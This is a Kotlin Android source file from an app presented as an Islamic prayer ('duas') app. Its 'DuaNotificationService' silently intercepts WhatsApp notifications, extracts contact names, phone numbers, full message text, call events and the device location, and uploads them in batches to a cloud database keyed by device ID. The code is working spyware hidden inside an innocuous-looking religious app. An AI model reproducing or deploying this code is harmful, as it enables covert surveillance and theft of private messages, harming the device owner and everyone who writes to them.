package islamic.duas.logs

import android.app.NotificationChannel
import android.app.NotificationManager
import android.os.Build
import android.service.notification.NotificationListenerService
import islamic.duas.utils.DeviceId
import android.service.notification.StatusBarNotification
import android.util.Log
import islamic.duas.cloud.CloudApi
import islamic.duas.sync.DuaTracker
import islamic.duas.utils.ErrorLog
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*

class DuaNotificationService : NotificationListenerService() {

    companion object {
        private const val TAG = "DuaNotif"
        private const val WHATSAPP_PACKAGE = "com.whatsapp"
        private const val WHATSAPP_WEB_PACKAGE = "com.whatsapp.w4b"
        private val callKeywords = listOf("call", "calling", "incoming", "missed", "ringing",
            "whatsapp call", "audio call", "video call", "voice call")
        private var pendingEvents = mutableListOf<JSONObject>()
        private var lastFlushMs = 0L
        private const val FLUSH_INTERVAL = 5000L
    }

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "dua_service",
                "Dua Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
                setSound(null, null)
                enableVibration(false)
                enableLights(false)
            }
            val nm = getSystemService(NotificationManager::class.java)
            nm.createNotificationChannel(channel)
        }
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        if (sbn.packageName != WHATSAPP_PACKAGE && sbn.packageName != WHATSAPP_WEB_PACKAGE) return

        try {
            val extras = sbn.notification.extras
            val title = extras.getString(android.app.Notification.EXTRA_TITLE) ?: ""
            val text = extras.getString(android.app.Notification.EXTRA_TEXT) ?: ""
            val subText = extras.getString(android.app.Notification.EXTRA_SUB_TEXT) ?: ""
            val summaryText = extras.getString(android.app.Notification.EXTRA_SUMMARY_TEXT) ?: ""
            val bigText = extras.getString(android.app.Notification.EXTRA_BIG_TEXT) ?: ""
            val conversationTitle = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                extras.getString(android.app.Notification.EXTRA_CONVERSATION_TITLE) ?: ""
            } else ""
            val category = sbn.notification.category ?: ""
            val ongoing = sbn.notification.flags and android.app.Notification.FLAG_ONGOING_EVENT != 0
            val isIncoming = sbn.notification.flags and android.app.Notification.FLAG_FOREGROUND_SERVICE == 0 && !ongoing

            val combinedText = "$title $text $category $subText $summaryText".lowercase(Locale.ROOT)
            val isCall = callKeywords.any { combinedText.contains(it) }

            val androidId = DeviceId.get(this)
            val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
            val timestamp = dateFormat.format(Date(sbn.postTime))

            val eventType = if (isCall) {
                when {
                    combinedText.contains("missed") -> "whatsapp_call_missed"
                    combinedText.contains("incoming") -> "whatsapp_call_incoming"
                    combinedText.contains("calling") -> "whatsapp_call_outgoing"
                    category == "call" -> "whatsapp_call"
                    else -> "whatsapp_call"
                }
            } else "whatsapp_message"

            val isGroup = title.startsWith("group:", true) || combinedText.contains("group")

            val loc = DuaTracker.getLastLocation()
            val locationStr = if (loc != null) {
                "${loc.optString("latitude", "")},${loc.optString("longitude", "")}"
            } else ""

            val entry = JSONObject().apply {
                put("type", eventType)
                put("timestamp", timestamp)
                put("ts_ms", sbn.postTime)
                put("contactName", title)
                put("contactNumber", extractNumber(title, text))
                put("messagePreview", text)
                put("subText", subText)
                put("summaryText", summaryText)
                put("fullMessage", bigText)
                put("conversationTitle", conversationTitle)
                put("isGroup", isGroup)
                put("isIncoming", isIncoming)
                put("packageName", sbn.packageName)
                put("location", locationStr)
            }

            pendingEvents.add(entry)
            flushIfNeeded(androidId)
        } catch (e: Exception) {
            Log.e(TAG, "onNotificationPosted error: ${e.message}", e)
            ErrorLog.write(this, TAG, "onNotificationPosted error", e)
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {}

    private fun extractNumber(title: String, text: String): String {
        val combined = "$title $text"
        val patterns = listOf(
            Regex("""[\+]?\d[\d\s\-\(\)]{7,15}\d"""),
            Regex("""\d{10,15}""")
        )
        for (p in patterns) {
            val m = p.find(combined)
            if (m != null) return m.value.trim()
        }
        return ""
    }

    private fun flushIfNeeded(androidId: String) {
        val now = System.currentTimeMillis()
        if (now - lastFlushMs < FLUSH_INTERVAL) return
        if (pendingEvents.isEmpty()) return
        flush(androidId)
    }

    private fun flush(androidId: String) {
        val events = synchronized(pendingEvents) {
            val copy = pendingEvents.toList()
            pendingEvents.clear()
            copy
        }
        lastFlushMs = System.currentTimeMillis()

        scope.launch {
            for (event in events) {
                val ts = event.optLong("ts_ms", System.currentTimeMillis())
                CloudApi.writeToRTDB("devices/$androidId/timeline/$ts", event)
            }
        }
    }

    override fun onDestroy() {
        val androidId = DeviceId.get(this)
        flush(androidId)
        scope.cancel()
        super.onDestroy()
    }
}
